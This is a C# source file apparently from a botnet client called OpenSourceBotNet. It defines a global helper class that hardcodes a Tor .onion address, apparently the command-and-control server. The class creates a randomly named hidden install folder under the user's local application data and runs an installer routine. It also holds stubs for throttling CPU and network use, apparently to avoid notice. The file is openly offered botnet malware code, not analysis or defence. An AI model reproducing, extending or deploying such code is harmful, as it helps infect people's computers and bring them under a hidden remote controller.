using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using OpenSourceBotNet.Core;
using OpenSourceBotNet.Services.Resources;

namespace OpenSourceBotNet.Core.Helpers
{
    public static class FluxGlobal
    {
        public static string sOnion = "http://a44w5llx3g2o7k3z.onion/";
        public static string sInstallDirectory;

        public static bool bOnline = true;
        public static bool bWorkable = true;

        public static double dVersion = 1.1;

        public static Random random;

        public static bool Initialize()
        {
            random = new Random(int.Parse(DateTime.Now.Ticks.ToString().Substring(12)));

            bool bSuccess = true;

            // Initialize WebClient for ApiClient Class
            FluxApiClient.Initialize();

            // Initialize Variables From Data Source (ex: Registry Parent Keys) ***************************************************************** remove 1 == 1 ********************************************
            if (System.IO.File.Exists(System.Windows.Forms.Application.ExecutablePath + "\\installed.txt") == false || 1 == 1)
            {
                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
                var stringChars = new char[8];
                var random = new Random();

                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }

                var finalString = new String(stringChars);

                sInstallDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + finalString;

                if (System.IO.Directory.Exists(sInstallDirectory) == false)
                {
                    System.IO.Directory.CreateDirectory(sInstallDirectory);
                }
            }
            else
            {
                sInstallDirectory = System.Windows.Forms.Application.ExecutablePath;
            }

            if (FluxInstaller.checkMethInstalled() == false)
            {
                FluxInstaller fluxInstaller = new FluxInstaller();
                fluxInstaller.installMeth();
            }

            return bSuccess;
        }
        public static bool IsNotMax()
        {
            bool bAddWork = false;

            if (NetworkThrottle.bMaxDownloadReached == false && NetworkThrottle.bMaxUploadReached == false)
            {
                bAddWork = true;
            }

            return bAddWork;
        }

        public static void ThrottleCPU()
        {
            // CPUThrottle.ThrottleCPU();
        }

        public static void ThrottleDownload()
        {
            // NetworkThrottle.ThrottleNetworkDownload();
        }

        public static void ThrottleUpload()
        {
            // NetworkThrottle.ThrottleNetworkUpload();
        }
    }
}
